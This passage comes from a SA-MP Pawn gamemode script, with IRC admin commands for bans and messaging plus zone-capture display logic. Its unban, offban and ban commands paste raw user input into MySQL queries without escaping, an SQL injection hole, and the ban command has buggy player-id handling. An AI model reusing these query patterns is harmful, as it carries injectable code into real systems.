			SendClientMessageToAll(COLOR_LIGHTBLUE, msg);
			format(msg, sizeof(msg),"2[PBOT] Please turn off your caps, or else you will be muted!", user, params);
			IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);
			return 1;
			}
			return 1;
}


IRCCMD:info(botid, channel[], user[], host[], params[])
{
	// Check if the user is at least an op in the channel
		new strmessage[950];
  		format(strmessage, sizeof(strmessage), "6[Server INFO]");
  		IRC_GroupSay(gGroupID, IRC_CHANNEL, strmessage);
        format(strmessage, sizeof(strmessage), "6[Server Ip] : 89.38.149.217:7777");
        IRC_GroupSay(gGroupID, IRC_CHANNEL, strmessage);
        format(strmessage, sizeof(strmessage), "6[GameMode] :Xp Call Of Duty - Real World at War.");
        IRC_GroupSay(gGroupID, IRC_CHANNEL, strmessage);
        format(strmessage, sizeof(strmessage), "6[Version] : 10.6.4");
        IRC_GroupSay(gGroupID, IRC_CHANNEL, strmessage);
        format(strmessage, sizeof(strmessage), "6[Website] : xenon-extreme.com");
		IRC_GroupSay(gGroupID, IRC_CHANNEL, strmessage);
	return true;
}
IRCCMD:unban(botid, channel[], user[], host[], params[])
{
if (IRC_IsAdmin(botid, channel, user))
			{
	  new target[50];
	  if(sscanf(params,"s", target)) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"11,1011,10Usage: !unban [player name]");
	  new query[200];
	  format(query, sizeof(query),"SELECT * FROM `bandata` WHERE `player`='%s' AND `banned`=1 LIMIT 1", target);
	  mysql_query(query);
	  mysql_store_result();
	  new rows = mysql_num_rows();
	  if(rows == 1)
	  {
	    new uquery[200];
	    format(uquery, sizeof(uquery),"DELETE FROM `bandata` WHERE player='%s'", target);
	    mysql_query(uquery);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"11,10IRC Unban - %s Unbanned!", target);
	    IRC_GroupSay(gGroupID, IRC_CHANNEL,string);

	  }
	  else if(!rows)
	  {
	    new str[128];
	    format(str, sizeof(str),"11,10[ERROR]: No ban was found on this name %s", target);
	    IRC_GroupSay(gGroupID, IRC_CHANNEL,str);
	    mysql_free_result();
	  }
  }
else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"11,10You are not authorized to use this command!");
return 1;
}

IRCCMD:say(botid, channel[], user[], host[], params[])
{
 if (!isnull(params))

 {

  if(IRC_IsOwner(botid, channel, user))
  {
			// Echo the formatted message
			new msg[112];
		 	format(msg,sizeof(msg), "(IRC-Owner)%s: "cwhite"%s", user, params);
			SendClientMessageToAll(red, msg);
			format(msg, sizeof(msg),"4(IRC-Owner) %s:1%s", user, params);
            IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);

		}
   else if(IRC_IsAdmin(botid, channel, user))
  {
			// Echo the formatted message
			new msg[112];
		 	format(msg,sizeof(msg), "(IRC-High_Admin)%s: "cwhite"%s", user, params);
			SendClientMessageToAll(red, msg);
			format(msg, sizeof(msg),"4(IRC-High_Admin) %s:1%s", user, params);
            IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);

		}

 else if(IRC_IsOp(botid, channel, user))
  {
			// Echo the formatted message
			new msg[112];
		 	format(msg,sizeof(msg), "(IRC-Admin)%s: "cwhite"%s", user, params);
			SendClientMessageToAll(red, msg);
			format(msg, sizeof(msg),"4(IRC-Admin) %s:1%s", user, params);
            IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);

		}
 else if(IRC_IsHalfop(botid, channel, user))
  {
			// Echo the formatted message
			new msg[112];
		 	format(msg,sizeof(msg), "(IRC-Mod)%s: "cwhite"%s", user, params);
			SendClientMessageToAll(red, msg);
			format(msg, sizeof(msg),"12(IRC-Mod) %s:1%s", user, params);
            IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);

		}



		else
  {
			// Echo the formatted message
			new msg[112];
		 	format(msg,sizeof(msg), "(IRC)%s: "cwhite"%s", user, params);
			SendClientMessageToAll(green, msg);
			format(msg, sizeof(msg),"4(IRC)%s:1%s", user, params);
            IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);

		}
}	return 1;
}

IRCCMD:offban(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOp(botid, channel, user))
  {
	 new targetname[50], reason[100];
    if(sscanf(params,"ss", targetname, reason)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"5Correct Usage: !offban <playername> [Reason]");
    {

	  new bquery[200];
      format(bquery, sizeof(bquery),"INSERT INTO bandata(admin, player, reason,  banned) VALUES('%s', '%s', '%s', 1)",user,targetname, reason);
      mysql_query(bquery);
	  mysql_store_result();

	    new string[200];
	    format(string, sizeof(string),"11,10Player %s's has been banned!.", targetname);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

	  }
  }return 0;
 }
IRCCMD:ban(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOp(botid, channel, user))
  {
    new targetid, reason[100];
    new endid;
    if(sscanf(params,"ds", targetid, reason)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"5Correct Usage: !ban [ID] [Reason]");
    if(!IsPlayerConnected(endid) && targetid != INVALID_PLAYER_ID)
    {
      IRC_GroupSay(gGroupID,IRC_CHANNEL,"4Invalid player id.");
    }
    else
    {
      new playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
	  GetPlayerName(targetid, playername, sizeof(playername)); GetPlayerName(endid, adminname, sizeof(adminname));
	  format(string,sizeof(string),"%s has been banned by Administrator %s.",playername,adminname);
//	  SendClientMessageToAll(red,string);
	  format(string,sizeof(string),"[Reason: %s]",params[2]);
//	  SendClientMessageToAll(red,string);
 	  SaveToFile("BanLog",string);
      for(new i = 1; i < MAX_REPORTS-1; i++) Reports[i] = Reports[i+1];
	  Bans[MAX_REPORTS-1] = string;
	  print(string);
      new bquery[200], IP[16];
      GetPlayerIp(targetid, IP, 16);
      format(bquery, sizeof(bquery),"INSERT INTO bandata(admin, player, reason, IP, banned) VALUES('%s', '%s', '%s','%s', 1)", PlayerName5(endid),PlayerName5(targetid), reason, IP);
      mysql_query(bquery);
//      new string[256];
      format(string, sizeof(string),"1,4%s has been banned by Admin %s [Reason: %s]", PlayerName5(targetid), user, reason);
     IRC_GroupSay(gGroupID,IRC_CHANNEL, string);
     format(string, sizeof(string),"%s has been banned by Admin %s [Reason: %s]", PlayerName5(targetid), user, reason);
     SendClientMessageToAll(red,string);
      mysql_free_result();
      SetTimerEx("DelayedKick", 1000, false, "i", targetid);
    }
  } else return IRC_GroupSay(gGroupID,IRC_CHANNEL,"4You are not authorized to use this command!");
  return 1;
}
#endif
//==============================================================================







//=====================[ SAVING DATA ] =========================================

forward SaveToFile(filename[],text[]);
public SaveToFile(filename[],text[])
{
    #if defined SAVE_LOGS
    new File:LAdminfile, filepath[256], string[256], year,month,day, hour,minute,second;
    getdate(year,month,day); gettime(hour,minute,second);

    format(filepath,sizeof(filepath),"ladmin/logs/%s.txt",filename);
    LAdminfile = fopen(filepath,io_append);
    format(string,sizeof(string),"[%d.%d.%d %d:%d:%d] %s\r\n %d",day,month,year,hour,minute,second,text);
    fwrite(LAdminfile,string);
    fclose(LAdminfile);
    #endif

    return 1;
}
CMD:parkour(playerid, params[])//parkour
{
        SetCameraBehindPlayer(playerid);
		SetPlayerFacingAngle(playerid, 0);
		SendClientMessage(playerid, COLOR_GREEN, "Race to the top!");
		SetTimerEx("PlayerUnfrozen", 3000, false, "i", playerid);
  		SetPlayerPos(playerid, 1410.3760,-1623.5972,54.6056);
  		SetPlayerCheckpoint(playerid, 1479.9905,-1343.4586,163.7188,6.0);
		SetPlayerArmour(playerid, 0);
		return 1;
}
forward Zones_Update();
public Zones_Update()
{
	new zone[MAX_ZONE_NAME], string[30];
	foreach(Player, i)
	{
		GetPlayer2DZone(i, zone, MAX_ZONE_NAME);
		format(string,sizeof(string),"%s", zone);
		TextDrawSetString(Zones[i], string);
		TextDrawShowForPlayer(i, Zones[i]);
	}
	return 1;
}

stock IsPlayerInZone(playerid, zone[])
{
	new TmpZone[MAX_ZONE_NAME];
	GetPlayer3DZone(playerid, TmpZone, sizeof(TmpZone));
	for(new i = 0; i != sizeof(gSAZones); i++)
	{
		if(strfind(TmpZone, zone, true) != -1)
			return 1;
	}
	return 0;
}

stock GetPlayer2DZone(playerid, zone[], len)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
 	for(new i = 0; i != sizeof(gSAZones); i++ )
 	{
		if(x >= gSAZones[i][SAZONE_AREA][0] && x <= gSAZones[i][SAZONE_AREA][3] && y >= gSAZones[i][SAZONE_AREA][1] && y <= gSAZones[i][SAZONE_AREA][4])
		{
		    return format(zone, len, gSAZones[i][SAZONE_NAME], 0);
		}
	}
	return 0;
}

stock GetPlayer3DZone(playerid, zone[], len)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
 	for(new i = 0; i != sizeof(gSAZones); i++ )
 	{
		if(x >= gSAZones[i][SAZONE_AREA][0] && x <= gSAZones[i][SAZONE_AREA][3] && y >= gSAZones[i][SAZONE_AREA][1] && y <= gSAZones[i][SAZONE_AREA][4] && z >= gSAZones[i][SAZONE_AREA][2] && z <= gSAZones[i][SAZONE_AREA][5])
		{
		    return format(zone, len, gSAZones[i][SAZONE_NAME], 0);
		}
	}
	return 0;
}
forward ZoneStats();
public ZoneStats()
{
	foreach(Player, playerid)
	{
		if(IsPlayerInDynamicCP(playerid, CP[SNAKE]) && UnderAttack[SNAKE] == 1 && IsPlayerCapturing[playerid][SNAKE] == 1)
		{
			new c_str[100];
		    if(tCP[SNAKE]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[SNAKE]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[SNAKE]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[SNAKE]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[SNAKE]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[SNAKE]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][SNAKE]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d %", CountVar[playerid][SNAKE]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Snake Farms~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
		if(IsPlayerInDynamicCP(playerid, CP[BAY]) && UnderAttack[BAY] == 1 && IsPlayerCapturing[playerid][BAY] == 1)
		{
			new c_str[100];
		    if(tCP[BAY]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[BAY]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[BAY]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[BAY]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[BAY]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[BAY]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][BAY]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d%", CountVar[playerid][BAY]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Bay Side~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
		if(IsPlayerInDynamicCP(playerid, CP[BIG]) && UnderAttack[BIG] == 1 && IsPlayerCapturing[playerid][BIG] == 1)
		{
			new c_str[100];
		    if(tCP[BIG]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[BIG]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[BIG]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[BIG]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[BIG]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[BIG]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][BIG]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d%", CountVar[playerid][BIG]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Area 51~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
		if(IsPlayerInDynamicCP(playerid, CP[ARMY]) && UnderAttack[ARMY] == 1 && IsPlayerCapturing[playerid][ARMY] == 1)
		{
			new c_str[100];
		    if(tCP[ARMY]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[ARMY]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[ARMY]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[ARMY]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[ARMY]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[ARMY]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][ARMY]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d%", CountVar[playerid][ARMY]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Army Resturant~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
		if(IsPlayerInDynamicCP(playerid, CP[PETROL]) && UnderAttack[PETROL] == 1 && IsPlayerCapturing[playerid][PETROL] == 1)
		{
			new c_str[100];
		    if(tCP[PETROL]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[PETROL]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[PETROL]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[PETROL]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[PETROL]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[PETROL]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][PETROL]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d%", CountVar[playerid][PETROL]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Petrol Bunk~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
		if(IsPlayerInDynamicCP(playerid, CP[OIL]) && UnderAttack[OIL] == 1 && IsPlayerCapturing[playerid][OIL] == 1)
		{
			new c_str[100];
		    if(tCP[OIL]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[OIL]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[OIL]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[OIL]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[OIL]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[OIL]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][OIL]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d%", CountVar[playerid][OIL]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Oil Refinary~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
		if(IsPlayerInDynamicCP(playerid, CP[DESERT]) && UnderAttack[DESERT] == 1 && IsPlayerCapturing[playerid][DESERT] == 1)
		{
			new c_str[100];
		    if(tCP[DESERT]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[DESERT]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[DESERT]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[DESERT]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[DESERT]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[DESERT]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][DESERT]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d%", CountVar[playerid][DESERT]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Gas Station~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
		if(IsPlayerInDynamicCP(playerid, CP[QUARRY]) && UnderAttack[QUARRY] == 1 && IsPlayerCapturing[playerid][QUARRY] == 1)
		{
			new c_str[100];
			if(tCP[QUARRY]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[QUARRY]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[QUARRY]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[QUARRY]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[QUARRY]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[QUARRY]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][QUARRY]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d%", CountVar[playerid][QUARRY]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Quarry~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
		if(IsPlayerInDynamicCP(playerid, CP[GUEST]) && UnderAttack[GUEST] == 1 && IsPlayerCapturing[playerid][GUEST] == 1)
		{
		    new c_str[100];
            if(tCP[GUEST]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[GUEST]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[GUEST]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[GUEST]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[GUEST]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[GUEST]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][GUEST]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d%", CountVar[playerid][GUEST]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Guest House~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
		if(IsPlayerInDynamicCP(playerid, CP[EAR]) && UnderAttack[EAR] == 1 && IsPlayerCapturing[playerid][EAR] == 1)
		{
		    new c_str[100];
		    if(tCP[EAR]==TEAM_EURASIA)
		    { c_str="Eurasia"; }
		    if(tCP[EAR]==TEAM_ARAB)
		    { c_str="Arabia"; }
		    if(tCP[EAR]==TEAM_SOVIET)
		    { c_str="Soviet"; }
		    if(tCP[EAR]==TEAM_USA)
		    { c_str="U.S.A"; }
		    if(tCP[EAR]==TEAM_AUS)
		    { c_str="Australia"; }
		    if(tCP[EAR]==TEAM_NONE)
		    { c_str="Nobody. YET!"; }

			//CountVar[playerid][EAR]--;
			new ZoneString[124];
			for(new x=0; x < 4; x++)
  			{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[x][playerid]); }
			format(ZoneString, sizeof(ZoneString),"%d%", CountVar[playerid][EAR]);
			TextDrawSetString(ZoneTextdraw_[3][playerid], ZoneString);
			format(ZoneString, sizeof(ZoneString),"~p~Zone: ~w~Bigear~n~~y~Controlled by: ~w~%s", c_str);
			TextDrawSetString(ZoneTextdraw_[2][playerid], ZoneString);
		}
	}
	return 1;
}


stock IsBomberPatriot(vehicleid)
{
   if(vehicleid == BomberPatriot[0]) return 1;
   else if(vehicleid == BomberPatriot[1]) return 1;
   else if(vehicleid == BomberPatriot[2]) return 1;
   else if(vehicleid == BomberPatriot[3]) return 1;
   else if(vehicleid == BomberPatriot[4]) return 1;
   return 0;
}

forward AntiPTBSpam(playerid);
public AntiPTBSpam(playerid)
{
   IsPTBAllowed[playerid] = 1;
   return 1;
}

stock GetXYZInFrontOfVehicle(vehicleid, &Float:x, &Float:y, &Float:z, Float:distance)
{
    new Float:a;
    GetVehiclePos(vehicleid, x, y, z);
    GetVehicleZAngle(vehicleid, a);
    x += (distance * floatsin(-a, degrees));
    y += (distance * floatcos(-a, degrees));
    z += 1.0;
}
#endif
//==============================================================================



